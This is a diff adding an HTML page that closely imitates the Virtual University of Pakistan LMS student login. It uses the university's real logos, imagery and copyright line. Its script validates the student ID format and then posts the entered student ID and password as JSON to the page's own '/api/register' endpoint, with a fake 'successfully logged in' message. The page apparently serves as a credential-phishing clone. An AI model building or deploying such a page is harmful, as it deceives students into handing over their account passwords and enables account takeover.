@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Learning Management System- Virtual University of Pakistan</title>
+    <meta name="description" content="Virtual University Learning Management System" />
+    <meta name="author" content="Lovable" />
+
+    <meta property="og:title" content="VU LMS Login" />
+    <meta property="og:description" content="Virtual University Learning Management System" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@lovable_dev" />
+    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+    
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <!-- Google Fonts - Noto Nastaliq Urdu -->
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu&display=swap" rel="stylesheet">
+    
+    <style>
+      /* Base styles */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+      }
+      
+      body {
+        background-color: #f4f6f9;
+        overflow-x: hidden;
+      }
+      
+      /* Main container */
+      .main-container {
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+      
+      /* Content container */
+      .content-container {
+        display: flex;
+        flex-direction: column-reverse;
+        flex-grow: 1;
+      }
+      
+      @media (min-width: 1000px) {
+        .content-container {
+          flex-direction: row;
+        }
+      }
+      
+      /* Login form section */
+      .login-form-section {
+        background-color: #ffffff;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        padding: 16px;
+      }
+      
+      @media (min-width: 1000px) {
+        .login-form-section {
+          width: 45vw;
+          padding: 80px;
+        }
+      }
+       @media (min-width: 1250px) {
+        .login-form-section {
+          width: 45vw;
+          padding: 130px;
+        }
+      }
+      .login-form-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      
+      /* Logo */
+      .logo {
+        text-align: center;
+        margin-bottom: 24px;
+      }
+      
+      .logo img {
+        max-width: 200px;
+        width: 100%;
+      }
+      
+      /* Error message */
+      .error-message {
+        width: 100%;
+        background-color: #fff1f0;
+        border: 1px solid #ffa39e;
+        color: #f5222d;
+        padding: 12px 16px;
+        border-radius: 4px;
+        margin-bottom: 16px;
+        position: relative;
+        display: none;
+      }
+      
+      /* Success message */
+      .success-message {
+        width: 100%;
+        background-color: #f6ffed;
+        border: 1px solid #b7eb8f;
+        color: #52c41a;
+        padding: 12px 16px;
+        border-radius: 4px;
+        margin-bottom: 16px;
+        position: relative;
+        display: none;
+      }
+      
+      .message-content {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      
+      .message-content i {
+        margin-right: 8px;
+      }
+      
+      .error-message button, .success-message button {
+        background: none;
+        border: none;
+        cursor: pointer;
+        font-size: 18px;
+      }
+      
+      .error-message button {
+        color: #f5222d;
+      }
+      
+      .success-message button {
+        color: #52c41a;
+      }
+      
+      /* Form */
+      .login-form {
+        width: 100%;
+      }
+      
+      .form-group {
+        margin-bottom: 16px;
+      }
+      
+      .input-field {
+        width: 100%;
+        padding: .85rem 1rem;
+        border: 1px solid #e2e8f0;
+        outline: none;
+        transition: border-color 0.2s;
+        font-size: 1rem;
+        line-height: 1.25;
+        border-radius: .25rem;
+      }
+      
+      .input-field:focus {
+        border-color: #5867dd;
+      }
+      
+      .password-wrapper {
+        position: relative;
+      }
+      
+      .password-toggle {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: #5867dd;
+      }
+      
+      .form-text {
+        text-align: left;
+      }
+      
+      .form-link {
+        color: #5867dd;
+        text-decoration: none;
+        font-size: 14px;
+      }
+      
+      .form-button {
+        background-color: #5867dd;
+        color: white;
+        border: none;
+        border-radius: 50px;
+        padding: 8px 25px;
+        padding: 1rem 2.5rem;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.2s;
+      }
+      
+      .form-button:hover {
+        background-color: #4554c7;
+      }
+      
+      .button-container {
+        display: flex;
+        justify-content: center;
+        margin-top: 16px;
+        margin-bottom: 16px;
+      }
+      
+      /* Additional links */
+      .additional-links {
+        width: 100%;
+        margin-top: 20px;
+      }
+      
+      .link-item {
+        display: flex;
+        align-items: center;
+        text-align: left;
+        margin-bottom: 12px;
+      }
+      
+      .link-item a {
+        display: flex;
+        align-items: center;
+        text-decoration: none;
+      }
+      
+      .link-item i {
+        margin-right: 8px;
+      }
+      
+      .link-item.datesheet a, .link-item.datesheet i {
+        color: #ff0000;
+      }
+      
+      .link-item.notice a, .link-item.handbook a {
+        color: #5867dd;
+      }
+      
+      .animate-pulse {
+        animation: pulse 2s infinite;
+      }
+      
+      @keyframes pulse {
+        0% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.5;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+      
+      /* Background section */
+      .background-section {
+        display: none;
+        flex-grow: 1;
+        background: linear-gradient(to bottom, #010413, #0745d6, #010413);
+        position: relative;
+      }
+      
+      @media (min-width: 768px) {
+        .background-section {
+          display: flex;
+          /* align-items: center; */
+          justify-content: center;
+          padding-top: 8rem;
+        }
+      }
+      
+      .background-overlay {
+        position: absolute;
+        inset: 0;
+        background-image: url('https://vulms.vu.edu.pk/App_Themes/Default/Images/bg/bg-New.png');
+        background-position: center;
+        /* background-repeat: no-repeat;
+        background-size: cover; */
+        z-index: 10;
+      }
+      
+      .background-content {
+        position: relative;
+        z-index: 20;
+        color: white;
+        text-align: center;
+        padding: 0 24px;
+      }
+      
+      .background-title {
+        font-size: 50px;
+        font-weight: 500;
+        margin-bottom: 24px;
+        /* text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); */
+        text-shadow: rgb(0, 0, 0) 3px 0px 0px,
+    rgb(0, 0, 0) 2.83487px 0.981584px 0px,
+    rgb(0, 0, 0) 2.35766px 1.85511px 0px,
+    rgb(0, 0, 0) 1.62091px 2.52441px 0px,
+    rgb(0, 0, 0) 0.705713px 2.91581px 0px,
+    rgb(0, 0, 0) -0.287171px 2.98622px 0px,
+    rgb(0, 0, 0) -1.24844px 2.72789px 0px,
+    rgb(0, 0, 0) -2.07227px 2.16926px 0px,
+    rgb(0, 0, 0) -2.66798px 1.37182px 0px,
+    rgb(0, 0, 0) -2.96998px 0.42336px 0px,
+    rgb(0, 0, 0) -2.94502px -0.571704px 0px,
+    rgb(0, 0, 0) -2.59586px -1.50383px 0px,
+    rgb(0, 0, 0) -1.96093px -2.27041px 0px,
+    rgb(0, 0, 0) -1.11013px -2.78704px 0px,
+    rgb(0, 0, 0) -0.137119px -2.99686px 0px,
+    rgb(0, 0, 0) 0.850987px -2.87677px 0px,
+    rgb(0, 0, 0) 1.74541px -2.43999px 0px,
+    rgb(0, 0, 0) 2.44769px -1.73459px 0px,
+    rgb(0, 0, 0) 2.88051px -0.838247px 0px;
+      }
+      
+      .quote-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 40px;
+      }
+      
+      .quote-mark {
+        margin: 0 8px;
+      }
+      
+      .quote-text {
+        display: inline-block;
+      }
+      
+      .quote-text.urdu {
+        font-family: 'Noto Nastaliq Urdu', serif;
+        text-shadow: rgb(0, 0, 0) 3px 0px 0px,
+    rgb(0, 0, 0) 2.83487px 0.981584px 0px,
+    rgb(0, 0, 0) 2.35766px 1.85511px 0px,
+    rgb(0, 0, 0) 1.62091px 2.52441px 0px,
+    rgb(0, 0, 0) 0.705713px 2.91581px 0px,
+    rgb(0, 0, 0) -0.287171px 2.98622px 0px,
+    rgb(0, 0, 0) -1.24844px 2.72789px 0px,
+    rgb(0, 0, 0) -2.07227px 2.16926px 0px,
+    rgb(0, 0, 0) -2.66798px 1.37182px 0px,
+    rgb(0, 0, 0) -2.96998px 0.42336px 0px,
+    rgb(0, 0, 0) -2.94502px -0.571704px 0px,
+    rgb(0, 0, 0) -2.59586px -1.50383px 0px,
+    rgb(0, 0, 0) -1.96093px -2.27041px 0px,
+    rgb(0, 0, 0) -1.11013px -2.78704px 0px,
+    rgb(0, 0, 0) -0.137119px -2.99686px 0px,
+    rgb(0, 0, 0) 0.850987px -2.87677px 0px,
+    rgb(0, 0, 0) 1.74541px -2.43999px 0px,
+    rgb(0, 0, 0) 2.44769px -1.73459px 0px,
+    rgb(0, 0, 0) 2.88051px -0.838247px 0px;
+      }
+      
+      .quote-refresh {
+        margin-left: 8px;
+        padding: 4px;
+        background-color: rgba(255, 255, 255, 0.2);
+        border-radius: 4px;
+        border: none;
+        cursor: pointer;
+        color: white;
+        transition: background-color 0.2s;
+      }
+      
+      .quote-refresh:hover {
+        background-color: rgba(255, 255, 255, 0.3);
+      }
+      
+      /* Mobile header */
+      .mobile-header {
+        display: flex;
+        width: 100%;
+        background: linear-gradient(to bottom, #010413, #0745d6, #010413);
+        position: relative;
+        min-height: 165px;
+      }
+      
+      @media (min-width: 768px) {
+        .mobile-header {
+          display: none;
+        }
+      }
+      
+      .mobile-header-overlay {
+        position: absolute;
+        inset: 0;
+        background-image: url('https://vulms.vu.edu.pk/App_Themes/Default/Images/bg/bg-New.png');
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        z-index: 10;
+      }
+      
+      .mobile-header-content {
+        position: relative;
+        z-index: 20;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+      
+        padding: 16px;
+        text-align: center;
+      }
+      
+      .mobile-title {
+        font-size: 20px;
+        font-weight: bold;
+        color: white;
+       text-shadow: rgb(0, 0, 0) 3px 0px 0px,
+    rgb(0, 0, 0) 2.83487px 0.981584px 0px,
+    rgb(0, 0, 0) 2.35766px 1.85511px 0px,
+    rgb(0, 0, 0) 1.62091px 2.52441px 0px,
+    rgb(0, 0, 0) 0.705713px 2.91581px 0px,
+    rgb(0, 0, 0) -0.287171px 2.98622px 0px,
+    rgb(0, 0, 0) -1.24844px 2.72789px 0px,
+    rgb(0, 0, 0) -2.07227px 2.16926px 0px,
+    rgb(0, 0, 0) -2.66798px 1.37182px 0px,
+    rgb(0, 0, 0) -2.96998px 0.42336px 0px,
+    rgb(0, 0, 0) -2.94502px -0.571704px 0px,
+    rgb(0, 0, 0) -2.59586px -1.50383px 0px,
+    rgb(0, 0, 0) -1.96093px -2.27041px 0px,
+    rgb(0, 0, 0) -1.11013px -2.78704px 0px,
+    rgb(0, 0, 0) -0.137119px -2.99686px 0px,
+    rgb(0, 0, 0) 0.850987px -2.87677px 0px,
+    rgb(0, 0, 0) 1.74541px -2.43999px 0px,
+    rgb(0, 0, 0) 2.44769px -1.73459px 0px,
+    rgb(0, 0, 0) 2.88051px -0.838247px 0px;
+        width: 100%;
+      }
+      
+      /* Footer */
+      .desktop-footer {
+        display: none;
+        background-color: #ffffff;
+        color: #5867dd;
+        padding: 16px 0;
+      }
+      
+      @media (min-width: 768px) {
+        .desktop-footer {
+          display: block;
+        }
+      }
+      
+      .footer-container {
+        /* max-width: 1320px; */
+        margin: 0 auto;
+        padding: 0 16px;
+      }
+      
+      .desktop-footer-content {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      
+      .footer-left {
+        display: flex;
+        align-items: center;
+      }
+      
+      .footer-logo {
+        margin-right: 16px;
+      }
+      
+      .footer-logo img {
+        height: 45px;
+        width: auto;
+      }
+      
+      .footer-links a {
+        color: #5867dd;
+        text-decoration: none;
+        margin-left: 16px;
+      }
+      
+      .footer-center {
+        text-align: center;
+        font-size: 14px;
+        color: #5867dd;
+      }
+      
+      .footer-right {
+        display: flex;
+        align-items: center;
+      }
+      
+      .social-icon {
+        margin-left: 16px;
+        font-size: 28px;
+        color: #5867dd;
+        text-decoration: none;
+        margin-top: -3px;
+      }
+      
+      .twitter-icon {
+        margin-left: 16px;
+        width: 24px;
+        height: 24px;
+      }
+      
+      /* Mobile footer */
+      .mobile-footer {
+        display: block;
+        background-color: #ffffff;
+        color: #5867dd;
+        padding: 12px 0;
+      }
+      
+      @media (min-width: 768px) {
+        .mobile-footer {
+          display: none;
+        }
+      }
+      
+      .mobile-footer-content {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+      }
+      
+      .mobile-footer-row {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      
+      .mobile-footer-logos {
+        display: flex;
+        align-items: center;
+      }
+      
+      .mobile-footer-logo {
+        margin-right: 8px;
+      }
+      
+      .mobile-footer-logo img {
+        height: 38px;
+        width: auto;
+      }
+      
+      .mobile-footer-social {
+        display: flex;
+        align-items: center;
+      }
+      
+      .mobile-footer-links {
+        display: flex;
+        gap: 12px;
+      }
+      
+      .mobile-footer-links a {
+        color: #5867dd;
+        text-decoration: none;
+        font-size: 14px;
+      }
+      
+      .mobile-footer-copyright {
+        font-size: 12px;
+        color: #5867dd;
+      }
+      
+      .validation-error {
+        color: #f5222d;
+        font-size: 12px;
+        margin-top: 4px;
+        display: none;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="main-container">
+      <!-- Main Content -->
+      <div class="content-container">
+        <!-- Login Form Section -->
+        <div class="login-form-section">
+          <div class="login-form-content">
+            <!-- Logo -->
+            <div class="logo">
+              <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/logos/Logo-New.png" alt="VU Logo">
+            </div>
+            
+            <!-- Error Message -->
+            <div class="error-message" id="errorMessage">
+              <div class="message-content">
+                <span id="errorText">Incorrect username or password. Please try again.</span>
+                <button type="button" onclick="closeError()">
+                  &times;
+                </button>
+              </div>
+            </div>
+            
+            <!-- Success Message -->
+            <div class="success-message" id="successMessage">
+              <div class="message-content">
+                <div>
+                  <i class="fas fa-check-circle"></i>
+                  <span id="successText">You have successfully logged in</span>
+                </div>
+                <button type="button" onclick="closeSuccess()">
+                  &times;
+                </button>
+              </div>
+            </div>
+            
+            <!-- Login Form -->
+            <form class="login-form" id="loginForm">
+              <div class="form-group">
+                <input 
+                  type="text" 
+                  id="studentID" 
+                  class="input-field" 
+                  placeholder="Student ID" 
+                  maxlength="12"
+                >
+                <div class="validation-error" id="studentIDError">Enter Student ID</div>
+              </div>
+              
+              <div class="form-group">
+                <div class="password-wrapper">
+                  <input 
+                    type="password" 
+                    id="password" 
+                    class="input-field" 
+                    placeholder="Password" 
+                   
+                  >
+                  <button 
+                    type="button" 
+                    class="password-toggle" 
+                    id="passwordToggle"
+                  >
+                    <i class="fas fa-eye" id="passwordIcon"></i>
+                  </button>
+                </div>
+                <div class="validation-error" id="passwordError">Enter Password</div>
+                <div class="validation-error" id="formatError">Invalid Student ID format. ID must start with "bc" followed by 9 digits.</div>
+              </div>
+              
+              <div class="form-text">
+                <a href="#" class="form-link">Forgot Password?</a>
+              </div>
+              
+              <div class="button-container">
+                <button type="submit" class="form-button">
+                  Sign In
+                </button>
+              </div>
+            </form>
+            
+            <!-- Additional Links -->
+            <div class="additional-links">
+              <div class="link-item datesheet">
+                <a href="#">
+                  <i class="fa fa-calendar"></i>
+                  <span class="animate-pulse">Check Your Datesheet</span>
+                </a>
+              </div>
+              
+              <div class="link-item notice">
+                <a href="#">
+                  <i class="fa fa-bell"></i>
+                  <span>Notice Board</span>
+                </a>
+              </div>
+              
+              <div class="link-item handbook">
+                <a href="#">
+                  <i class="fa fa-book"></i>
+                  <span>Student Hand Book</span>
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Background Section - Hidden on Mobile, Visible on Desktop -->
+        <div class="background-section">
+          <div class="background-overlay"></div>
+          <div class="background-content">
+            <h3 class="background-title">Learning Management System</h3>
+            <div class="quote-container">
+              <span class="quote-mark">"</span>
+              <span class="quote-text urdu" id="quoteText">
+                ناقص عقل گناہ کے وقت محافظت نہیں کر سکتی۔ بو علی سینا
+              </span>
+              <span class="quote-mark">"</span>
+              <button 
+                class="quote-refresh" 
+                id="quoteRefresh"
+              >
+                <i class="fas fa-sync-alt"></i>
+              </button>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Mobile Header - Only Visible on Mobile -->
+        <div class="mobile-header">
+          <div class="mobile-header-overlay"></div>
+          <div class="mobile-header-content">
+            <h5 class="mobile-title">Learning Management System</h5>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Desktop Footer -->
+      <footer class="desktop-footer">
+        <div class="footer-container">
+          <div class="desktop-footer-content">
+            <!-- Left - Logo Section -->
+            <div class="footer-left">
+              <div class="footer-logo">
+                <a href="#">
+                  <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/logos/logo-1.png" alt="Logo">
+                </a>
+              </div>
+              <div class="footer-logo">
+                <a href="#">
+                  <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/logos/logo_govt_of_pakistan.png" alt="Govt Logo">
+                </a>
+              </div>
+              <div class="footer-links">
+                <a href="#">Contact Us</a>
+                <a href="#"><b>Help</b></a>
+              </div>
+            </div>
+            
+            <!-- Center - Copyright -->
+            <div class="footer-center">
+              <span>© 2020 IT Department, Virtual University of Pakistan.</span>
+            </div>
+            
+            <!-- Right - Social Icons -->
+            <div class="footer-right">
+              <a href="#" class="social-icon">
+                <i class="fab fa-facebook-square"></i>
+              </a>
+              <a href="#">
+                <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/twitter32.png" alt="Twitter" class="twitter-icon">
+              </a>
+            </div>
+          </div>
+        </div>
+      </footer>
+      
+      <!-- Mobile Footer -->
+      <footer class="mobile-footer">
+        <div class="footer-container">
+          <div class="mobile-footer-content">
+            <!-- Top Row with Logos and Social Icons -->
+            <div class="mobile-footer-row">
+              <div class="mobile-footer-logos">
+                <div class="mobile-footer-logo">
+                  <a href="#">
+                    <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/logos/logo-1.png" alt="Logo">
+                  </a>
+                </div>
+                <div class="mobile-footer-logo">
+                  <a href="#">
+                    <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/logos/logo_govt_of_pakistan.png" alt="Govt Logo">
+                  </a>
+                </div>
+              </div>
+              <div class="mobile-footer-social">
+                <a href="#" class="social-icon">
+                  <i class="fab fa-facebook-square"></i>
+                </a>
+                <a href="#">
+                  <img src="https://vulms.vu.edu.pk/App_Themes/Default/Images/twitter32.png" alt="Twitter" class="twitter-icon">
+                </a>
+              </div>
+            </div>
+            
+            <!-- Bottom Row with Links and Copyright -->
+            <div class="mobile-footer-row">
+              <div class="mobile-footer-links">
+                <a href="#">Contact Us</a>
+                <a href="#"><b>Help</b></a>
+              </div>
+            </div>
+            <div class="mobile-footer-copyright">
+              © 2020 IT Department, Virtual University of Pakistan.
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+    
+    <script>
+
+
+
+
+  // DOM Elements
+      const loginForm = document.getElementById('loginForm');
+      const studentID = document.getElementById('studentID');
+      const password = document.getElementById('password');
+      const studentIDError = document.getElementById('studentIDError');
+      const passwordError = document.getElementById('passwordError');
+      const formatError = document.getElementById('formatError');
+      const errorMessage = document.getElementById('errorMessage');
+      const successMessage = document.getElementById('successMessage');
+      const passwordToggle = document.getElementById('passwordToggle');
+      const passwordIcon = document.getElementById('passwordIcon');
+      const quoteText = document.getElementById('quoteText');
+      const quoteRefresh = document.getElementById('quoteRefresh');
+      
+      // Quotes Array
+      const quotes = [
+        { text: "ناقص عقل گناہ کے وقت محافظت نہیں کر سکتی۔ بو علی سینا", lang: "urdu" },
+        { text: "Knowledge is power. - Francis Bacon", lang: "english" }
+      ];
+      
+      // Toggle Password Visibility
+      passwordToggle.addEventListener('click', () => {
+        if (password.type === 'password') {
+          password.type = 'text';
+          passwordIcon.classList.remove('fa-eye');
+          passwordIcon.classList.add('fa-eye-slash');
+        } else {
+          password.type = 'password';
+          passwordIcon.classList.remove('fa-eye-slash');
+          passwordIcon.classList.add('fa-eye');
+        }
+      });
+      
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        studentIDError.style.display = 'none';
+        passwordError.style.display = 'none';
+        formatError.style.display = 'none';
+        errorMessage.style.display = 'none';
+        successMessage.style.display = 'none';
+        let isValid = true;
+        if (!studentID.value.trim()) {
+          studentIDError.style.display = 'block';
+          isValid = false;
+        } else {
+          const idRegex = /^bc\d{9}$/i;
+          if (!idRegex.test(studentID.value.trim())) {
+            formatError.style.display = 'block';
+            isValid = false;
+          }
+        }
+        if (!password.value.trim()) {
+          passwordError.style.display = 'block';
+          isValid = false;
+        }
+        if (isValid) {
+          try {
+            const response = await fetch('/api/register', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                studentID: studentID.value.trim(),
+                password: password.value.trim(),
+              }),
+            });
+            const data = await response.json();
+            if (response.ok) {
+              successMessage.style.display = 'block';
+              document.getElementById('successText').textContent = data.message;
+              loginForm.reset();
+            } else {
+              errorMessage.style.display = 'block';
+              document.getElementById('errorText').textContent = data.message;
+            }
+          } catch (error) {
+            errorMessage.style.display = 'block';
+            document.getElementById('errorText').textContent = 'Failed to connect to server';
+          }
+        }
+      });
+
+      // Close Messages
+      function closeError() {
+        errorMessage.style.display = 'none';
+      }
+      function closeSuccess() {
+        successMessage.style.display = 'none';
+      }
+
+      // Refresh Quote
+      quoteRefresh.addEventListener('click', () => {
+        const randomIndex = Math.floor(Math.random() * quotes.length);
+        const newQuote = quotes[randomIndex];
+        quoteText.textContent = newQuote.text;
+        if (newQuote.lang === 'urdu') {
+          quoteText.classList.add('urdu');
+          quoteText.classList.remove('english');
+        } else {
+          quoteText.classList.remove('urdu');
+          quoteText.classList.add('english');
+        }
+      });
+
+
+
+    </script>
+
+    <script src="server.js"></script>
+  </body>
+</html>
